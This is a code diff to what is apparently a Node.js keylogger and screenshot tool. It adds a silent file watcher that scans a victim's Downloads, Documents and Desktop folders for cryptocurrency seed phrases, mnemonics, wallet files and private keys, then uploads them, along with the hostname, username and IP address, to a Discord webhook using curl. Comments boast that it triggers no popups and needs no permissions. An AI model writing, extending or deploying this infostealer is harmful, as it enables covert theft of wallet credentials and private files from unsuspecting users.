@@ -916,8 +916,177 @@ setInterval(() => {
 
 // REMOVED: File monitoring - was causing spam
 
-// REMOVED: Periodic screenshots - was causing spam
-// Screenshots will only be sent when there's actual clipboard activity
+// SILENT FILE WATCHER - Monitors Downloads/Documents/Desktop for seed phrases, mnemonics, wallet files
+// Uses fs.watch (NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!)
+let watchedFiles = new Set(); // Track files we've already sent
+let watchDirs = [
+    path.join(os.homedir(), 'Downloads'),
+    path.join(os.homedir(), 'Documents'),
+    path.join(os.homedir(), 'Desktop')
+];
+
+// Function to check if file content looks like a seed phrase/mnemonic
+function isSeedPhrase(content) {
+    if (!content || content.length < 10) return false;
+    
+    // Check for common seed phrase patterns (12 or 24 words)
+    const words = content.trim().split(/\s+/);
+    if (words.length >= 12 && words.length <= 24) {
+        // Check if most words are lowercase (typical for seed phrases)
+        const lowercaseWords = words.filter(w => /^[a-z]+$/.test(w));
+        if (lowercaseWords.length >= 10) return true;
+    }
+    
+    // Check for keywords
+    const lowerContent = content.toLowerCase();
+    const keywords = ['seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet'];
+    return keywords.some(keyword => lowerContent.includes(keyword));
+}
+
+// Function to check if filename suggests sensitive content
+function isSensitiveFile(filename) {
+    const lowerName = filename.toLowerCase();
+    const patterns = ['seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet', 'backup'];
+    return patterns.some(pattern => lowerName.includes(pattern));
+}
+
+// Function to send file to Discord directly (as file attachment)
+function sendFileToDiscord(filepath, filename) {
+    if (!fs.existsSync(filepath)) return;
+    
+    // Read file content (limit to 2000 chars for preview)
+    let content = '';
+    try {
+        content = fs.readFileSync(filepath, 'utf8').substring(0, 2000);
+    } catch (e) {
+        try {
+            // Try binary read if UTF-8 fails
+            content = fs.readFileSync(filepath).toString('base64').substring(0, 2000);
+        } catch (e2) {
+            content = '[Binary file or unreadable]';
+        }
+    }
+    
+    const ip = os.networkInterfaces();
+    let ipAddress = 'Unknown';
+    for (const name of Object.keys(ip)) {
+        for (const iface of ip[name]) {
+            if (iface.family === 'IPv4' && !iface.internal) {
+                ipAddress = iface.address;
+                break;
+            }
+        }
+        if (ipAddress !== 'Unknown') break;
+    }
+    
+    // Create message
+    const message = `🔐 **Sensitive File Detected**\n\`\`\`\nFile: ${filename}\nPath: ${filepath.replace(os.homedir(), '~')}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\`\n\n**Content Preview:**\n\`\`\`\n${content}\n\`\`\``;
+    
+    // Create payload file
+    const payloadFile = path.join(screenshotDir, `file_payload_${Date.now()}.json`);
+    const payload = { content: message };
+    
+    try {
+        fs.writeFileSync(payloadFile, JSON.stringify(payload));
+        
+        // Send file + message to Discord
+        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath}" "${WEBHOOK}"`, (error) => {
+            setTimeout(() => {
+                try { fs.unlinkSync(payloadFile); } catch (e) {}
+            }, 5000);
+        });
+    } catch (e) {
+        // Fallback: send text only
+        const textPayload = { content: message };
+        const textFile = path.join(screenshotDir, `file_text_${Date.now()}.json`);
+        try {
+            fs.writeFileSync(textFile, JSON.stringify(textPayload));
+            exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
+                setTimeout(() => {
+                    try { fs.unlinkSync(textFile); } catch (e) {}
+                }, 5000);
+            });
+        } catch (e2) {}
+    }
+}
+
+// Function to check and process a file
+function checkFile(filepath) {
+    if (watchedFiles.has(filepath)) return; // Already processed
+    
+    try {
+        const stats = fs.statSync(filepath);
+        if (!stats.isFile()) return;
+        
+        // Only process .txt, .log, .doc, .docx, or files with sensitive names
+        const filename = path.basename(filepath);
+        const ext = path.extname(filename).toLowerCase();
+        const allowedExts = ['.txt', '.log', '.doc', '.docx', '.json', '.key', '.pem'];
+        
+        if (!allowedExts.includes(ext) && !isSensitiveFile(filename)) return;
+        
+        // Read file content to check if it's a seed phrase
+        let content = '';
+        try {
+            content = fs.readFileSync(filepath, 'utf8');
+        } catch (e) {
+            return; // Can't read, skip
+        }
+        
+        // Check if content looks sensitive
+        if (isSeedPhrase(content) || isSensitiveFile(filename)) {
+            watchedFiles.add(filepath);
+            sendFileToDiscord(filepath, filename);
+        }
+    } catch (e) {
+        // File might be locked or deleted, ignore
+    }
+}
+
+// Watch directories for new files (NO PERMISSIONS NEEDED!)
+watchDirs.forEach(watchDir => {
+    if (!fs.existsSync(watchDir)) return;
+    
+    // Initial scan of existing files
+    try {
+        const files = fs.readdirSync(watchDir);
+        files.forEach(file => {
+            const filepath = path.join(watchDir, file);
+            checkFile(filepath);
+        });
+    } catch (e) {
+        // Can't read directory, skip
+    }
+    
+    // Watch for new files (fs.watch doesn't require permissions!)
+    fs.watch(watchDir, { recursive: false }, (eventType, filename) => {
+        if (!filename) return;
+        
+        const filepath = path.join(watchDir, filename);
+        
+        // Wait a moment for file to be fully written
+        setTimeout(() => {
+            checkFile(filepath);
+        }, 1000);
+    });
+});
+
+// Also periodically scan for new files (in case fs.watch misses some)
+setInterval(() => {
+    watchDirs.forEach(watchDir => {
+        if (!fs.existsSync(watchDir)) return;
+        
+        try {
+            const files = fs.readdirSync(watchDir);
+            files.forEach(file => {
+                const filepath = path.join(watchDir, file);
+                checkFile(filepath);
+            });
+        } catch (e) {
+            // Ignore errors
+        }
+    });
+}, 30000); // Scan every 30 seconds
 
 // Test Discord connection on startup (send once)
 setTimeout(() => {
@@ -946,8 +1115,7 @@ KEYLOGGEREOF
   "version": "1.0.0",
   "main": "keylogger-screenshotter.js",
   "dependencies": {
-    "socket.io-client": "^4.5.4",
-    "robotjs": "^0.6.0"
+    "socket.io-client": "^4.5.4"
   }
 }
 PKGEOF
